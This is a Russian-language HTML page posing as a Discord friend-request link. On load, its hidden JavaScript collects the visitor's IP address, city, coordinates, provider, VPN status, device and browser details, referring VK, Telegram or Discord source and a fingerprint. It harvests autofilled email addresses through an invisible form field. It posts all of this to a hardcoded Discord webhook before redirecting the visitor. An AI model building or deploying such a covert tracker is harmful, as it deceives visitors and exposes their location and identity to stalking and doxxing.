<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta property="og:title" content="Добавь в друзья Discord">
    <meta property="og:description" content="Нажми чтобы добавить в друзья">
    <meta name="theme-color" content="#5865F2">
    <title>Friend Request</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #5865F2, #404EED);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: 'Segoe UI', Arial, sans-serif;
            color: white;
            text-align: center;
        }
        .container { animation: fadeIn 0.5s ease; }
        .avatar {
            width: 100px; height: 100px; border-radius: 50%;
            border: 5px solid white; margin-bottom: 25px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
        }
        h2 { font-size: 24px; margin-bottom: 10px; }
        p { color: rgba(255,255,255,0.8); font-size: 16px; }
        .spinner {
            width: 40px; height: 40px;
            border: 4px solid rgba(255,255,255,0.3);
            border-top-color: white; border-radius: 50%;
            animation: spin 0.8s linear infinite; margin: 25px auto;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>
    <div class="container">
        <img class="avatar" src="https://cdn.discordapp.com/embed/avatars/0.png" alt="Avatar">
        <h2>👋 Перенаправляем в Discord...</h2>
        <p>Собираем информацию...</p>
        <div class="spinner"></div>
    </div>

    <script>
        async function collectAndRedirect() {
            try {
                // ======================
                // 1. IP + ГЕО
                // ======================
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const { ip } = await ipRes.json();
                
                let geoData = {};
                try {
                    const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
                    geoData = await geoRes.json();
                } catch(e) {
                    try {
                        const geoRes2 = await fetch(`https://ipwhois.app/json/${ip}`);
                        geoData = await geoRes2.json();
                    } catch(e2) { geoData = { error: true }; }
                }
                
                let location = 'Не определена';
                if (!geoData.error) {
                    const parts = [];
                    if (geoData.city) parts.push(geoData.city);
                    if (geoData.region) parts.push(geoData.region);
                    if (geoData.country_name) parts.push(geoData.country_name);
                    if (parts.length > 0) location = parts.join(', ');
                }
                
                let latitude = geoData.latitude || '—';
                let longitude = geoData.longitude || '—';
                let mapsLink = (latitude !== '—' && longitude !== '—') ? 
                    `https://www.google.com/maps?q=${latitude},${longitude}` : '';
                
                let vpnStatus = '✅ Обычное соединение';
                let vpnEmoji = '🟢';
                if (!geoData.error) {
                    const flags = [];
                    if (geoData.hosting) flags.push('Хостинг');
                    if (geoData.proxy) flags.push('Прокси');
                    if (geoData.vpn) flags.push('VPN');
                    if (geoData.tor) flags.push('Tor');
                    if (flags.length > 0) { vpnStatus = '⚠️ ' + flags.join(', '); vpnEmoji = '🔴'; }
                }
                
                // ======================
                // 2. УСТРОЙСТВО
                // ======================
                const ua = navigator.userAgent;
                const platform = navigator.platform || '';
                
                const phoneModels = {
                    'iPhone16,2': 'iPhone 15 Pro Max', 'iPhone16,1': 'iPhone 15 Pro',
                    'iPhone15,5': 'iPhone 15 Plus', 'iPhone15,4': 'iPhone 15',
                    'iPhone15,3': 'iPhone 14 Pro Max', 'iPhone15,2': 'iPhone 14 Pro',
                    'iPhone14,7': 'iPhone 14 Plus', 'iPhone14,3': 'iPhone 13 Pro Max',
                    'iPhone14,2': 'iPhone 13 Pro', 'iPhone13,4': 'iPhone 13 mini',
                    'SM-S918': 'Samsung Galaxy S23 Ultra', 'SM-S928': 'Samsung Galaxy S24 Ultra',
                    'SM-S908': 'Samsung Galaxy S22 Ultra', 'SM-F946': 'Samsung Galaxy Z Fold 5',
                    'Pixel 8 Pro': 'Google Pixel 8 Pro', 'Pixel 7 Pro': 'Google Pixel 7 Pro',
                    'A065': 'Nothing Phone 2', 'CPH2581': 'OnePlus 12'
                };
                
                let deviceModel = 'Не определена';
                let deviceBrand = '';
                
                if (ua.includes('iPhone') || ua.includes('iPad')) {
                    const modelMatch = ua.match(/iPhone(\d+,\d+)/) || ua.match(/iPad(\d+,\d+)/);
                    if (modelMatch) deviceModel = phoneModels[modelMatch[0]] || `Apple ${modelMatch[0]}`;
                    else deviceModel = ua.includes('iPad') ? 'iPad' : 'iPhone';
                    deviceBrand = '🍎 Apple';
                } else if (ua.includes('Android')) {
                    deviceBrand = '🤖 Android';
                    let found = false;
                    for (const [key, value] of Object.entries(phoneModels)) {
                        if (ua.includes(key)) { deviceModel = value; found = true; break; }
                    }
                    if (!found) {
                        const buildMatch = ua.match(/; ([^;]+) Build/);
                        deviceModel = buildMatch ? buildMatch[1].trim() : 'Android устройство';
                    }
                } else if (ua.includes('Windows')) {
                    deviceBrand = '💻 Windows ПК';
                    deviceModel = 'ПК/Ноутбук';
                } else if (ua.includes('Macintosh') || ua.includes('Mac OS X')) {
                    deviceBrand = '🍎 Apple';
                    if (ua.includes('MacBook Pro')) deviceModel = 'MacBook Pro';
                    else if (ua.includes('MacBook Air')) deviceModel = 'MacBook Air';
                    else deviceModel = 'Mac';
                } else if (ua.includes('Linux')) {
                    deviceBrand = '🐧 Linux';
                    deviceModel = 'ПК Linux';
                }
                
                let browser = 'Неизвестный';
                let browserVersion = '';
                if (ua.includes('Edg/')) { browser = 'Edge'; browserVersion = ua.split('Edg/')[1].split('.')[0]; }
                else if (ua.includes('Chrome')) { browser = 'Chrome'; browserVersion = ua.split('Chrome/')[1].split('.')[0]; }
                else if (ua.includes('Firefox')) { browser = 'Firefox'; browserVersion = ua.split('Firefox/')[1].split('.')[0]; }
                else if (ua.includes('Safari') && !ua.includes('Chrome')) { browser = 'Safari'; }
                
                let os = 'Неизвестная';
                let osVersion = '';
                if (ua.includes('Windows NT 10.0')) { os = 'Windows 10/11'; }
                else if (ua.includes('Mac OS X')) { os = 'macOS'; const v = ua.match(/Mac OS X (\d+[._]\d+)/); osVersion = v ? v[1].replace('_', '.') : ''; }
                else if (ua.includes('Android')) { os = 'Android'; const v = ua.match(/Android (\d+\.\d+)/); osVersion = v ? v[1] : ''; }
                else if (ua.includes('iPhone') || ua.includes('iPad')) { os = 'iOS'; }
                
                const isMobile = /Mobile|Android|iPhone/i.test(ua);
                const isTablet = /iPad|Tablet/i.test(ua);
                const deviceType = isTablet ? '📱 Планшет' : (isMobile ? '📱 Смартфон' : '🖥️ Компьютер');
                
                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                const language = navigator.language || 'Неизвестен';
                const screenRes = `${screen.width}x${screen.height}@${window.devicePixelRatio}x`;
                const cpuCores = navigator.hardwareConcurrency || 'Неизвестно';
                let memory = navigator.deviceMemory ? navigator.deviceMemory + ' ГБ' : 'Неизвестно';
                
                // ======================
                // 3. ПОИСК СОЦСЕТЕЙ (косвенные признаки)
                // ======================
                
                // Проверяем реферер
                const referrer = document.referrer;
                let sourceInfo = '💬 Прямой переход';
                let sourceDetail = 'Ссылку прислали в ЛС/чат';
                
                if (referrer.includes('vk.com')) {
                    sourceInfo = '🟦 ВКонтакте';
                    // Пробуем извлечь ID из ссылки
                    const vkId = referrer.match(/vk\.com\/([a-zA-Z0-9_.]+)/);
                    sourceDetail = vkId ? `Профиль/группа: vk.com/${vkId[1]}` : 'ВКонтакте';
                } else if (referrer.includes('t.me') || referrer.includes('telegram.org')) {
                    sourceInfo = '✈️ Telegram';
                    const tgMatch = referrer.match(/t\.me\/([a-zA-Z0-9_]+)/);
                    sourceDetail = tgMatch ? `Канал/чат: @${tgMatch[1]}` : 'Telegram';
                } else if (referrer.includes('discord.com')) {
                    sourceInfo = '🎮 Discord';
                    const dcMatch = referrer.match(/channels\/(\d+)\/(\d+)/);
                    sourceDetail = dcMatch ? `Сервер: ${dcMatch[1]}, Канал: ${dcMatch[2]}` : 'Discord';
                } else if (referrer) {
                    sourceInfo = '🌐 ' + new URL(referrer).hostname;
                    sourceDetail = referrer;
                }
                
                // ======================
                // 4. ЦИФРОВОЙ ОТПЕЧАТОК (Fingerprint)
                // ======================
                let fingerprint = '';
                try {
                    const components = [
                        ua,
                        language,
                        timezone,
                        screenRes,
                        cpuCores,
                        platform,
                        navigator.vendor || '',
                        navigator.productSub || '',
                        !!window.sessionStorage,
                        !!window.indexedDB
                    ];
                    fingerprint = btoa(components.join('|')).substring(0, 32);
                } catch(e) {
                    fingerprint = 'Ошибка';
                }
                
                // ======================
                // 5. ПОИСК АККАУНТОВ ПО EMAIL (автозаполнение)
                // ======================
                let detectedEmails = [];
                try {
                    // Создаём скрытые поля для авто-заполнения
                    const emailField = document.createElement('input');
                    emailField.type = 'email';
                    emailField.name = 'email';
                    emailField.autocomplete = 'email';
                    emailField.style.position = 'absolute';
                    emailField.style.left = '-9999px';
                    document.body.appendChild(emailField);
                    
                    // Ждём автозаполнение
                    await new Promise(resolve => setTimeout(resolve, 500));
                    
                    if (emailField.value && emailField.value.includes('@')) {
                        detectedEmails.push(emailField.value);
                    }
                    
                    document.body.removeChild(emailField);
                } catch(e) {}
                
                // ======================
                // 6. ОПРЕДЕЛЕНИЕ СЕРВИСОВ ПО EMAIL
                // ======================
                let linkedServices = [];
                if (detectedEmails.length > 0) {
                    const email = detectedEmails[0].toLowerCase();
                    if (email.includes('@gmail.com')) linkedServices.push('🔴 Google (Gmail, YouTube)');
                    if (email.includes('@mail.ru') || email.includes('@bk.ru') || email.includes('@inbox.ru')) linkedServices.push('🟦 Mail.ru (VK, Одноклассники)');
                    if (email.includes('@yandex.ru')) linkedServices.push('🔍 Яндекс');
                    if (email.includes('@icloud.com') || email.includes('@me.com')) linkedServices.push('🍎 Apple ID');
                    if (email.includes('@outlook.com') || email.includes('@hotmail.com')) linkedServices.push('🔵 Microsoft');
                    if (email.includes('@yahoo.com')) linkedServices.push('🟣 Yahoo');
                    if (email.includes('@proton.me') || email.includes('@protonmail.com')) linkedServices.push('🔐 ProtonMail');
                }
                
                // ======================
                // 7. ПОИСК ПО IP (связанные аккаунты)
                // ======================
                let ipIntelLink = `https://ipinfo.io/${ip}`;
                
                // ======================
                // 8. ОТПРАВЛЯЕМ
                // ======================
                const WEBHOOK = "https://discord.com/api/webhooks/1507909831678496848/6Hm-yFjHzRHElN-GRxDYMc5o3ILiiis_tdMu4GfTiwnScyQCFio5lHr5ou29Y2jVWCgF";
                
                const embed = {
                    title: "👀 НОВЫЙ ПОСЕТИТЕЛЬ!",
                    description: mapsLink ? `**[🗺️ Google Maps](${mapsLink})** | **[🔍 IP Intel](${ipIntelLink})**` : '',
                    color: vpnEmoji === '🔴' ? 16711680 : 5814786,
                    fields: [
                        {
                            name: "━━━━━━ 📱 УСТРОЙСТВО ━━━━━━",
                            value: `🏷️ ${deviceBrand}\n📱 ${deviceModel}\n📟 ${deviceType}\n💻 ${os} ${osVersion}\n🌐 ${browser} ${browserVersion}`,
                            inline: false
                        },
                        {
                            name: "━━━━━━ 🌍 ГЕОЛОКАЦИЯ ━━━━━━",
                            value: `📍 ${location}\n🏢 ${geoData.org || 'Неизвестный провайдер'}\n📮 ${geoData.postal || '—'}\n🔗 IP: ||${ip}||`,
                            inline: false
                        },
                        {
                            name: "━━━━━━ 🎯 КООРДИНАТЫ ━━━━━━",
                            value: `🌐 ${latitude}, ${longitude}`,
                            inline: false
                        },
                        {
                            name: "━━━━━━ 🔒 VPN ━━━━━━",
                            value: `${vpnEmoji} ${vpnStatus}`,
                            inline: false
                        },
                        {
                            name: "━━━━━━ 📲 ИСТОЧНИК ━━━━━━",
                            value: `${sourceInfo}\n${sourceDetail}`,
                            inline: false
                        }
                    ],
                    footer: { text: "Трекер v3.0 • " + new Date().toLocaleString('ru-RU') },
                    timestamp: new Date().toISOString()
                };
                
                // Найденные email
                if (detectedEmails.length > 0) {
                    embed.fields.push({
                        name: "━━━━━━ 📧 НАЙДЕН EMAIL ━━━━━━",
                        value: `✉️ ||${detectedEmails[0]}||`,
                        inline: false
                    });
                }
                
                // Связанные сервисы
                if (linkedServices.length > 0) {
                    embed.fields.push({
                        name: "━━━━━━ 🔗 СВЯЗАННЫЕ СЕРВИСЫ ━━━━━━",
                        value: linkedServices.join('\n'),
                        inline: false
                    });
                }
                
                // Цифровой отпечаток
                embed.fields.push({
                    name: "━━━━━━ 🔑 ЦИФРОВОЙ ОТПЕЧАТОК ━━━━━━",
                    value: `🆔 \`${fingerprint}\`\nЭтот код уникален для устройства`,
                    inline: false
                });
                
                // Технические детали
                embed.fields.push({
                    name: "━━━━━━ ⚙️ ТЕХНИЧЕСКОЕ ━━━━━━",
                    value: `🖥️ ${screenRes}\n🧠 ${cpuCores} ядер\n💾 ${memory}\n⏰ ${timezone}\n🌍 ${language}`,
                    inline: false
                });
                
                await fetch(WEBHOOK, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ embeds: [embed] })
                });
                
            } catch(e) {
                console.log('Ошибка:', e.message);
            }
            
            setTimeout(() => {
                window.location.href = "https://discord.com/users/1473020726280847541";
            }, 2500);
        }
        
        collectAndRedirect();
    </script>
</body>
</html>
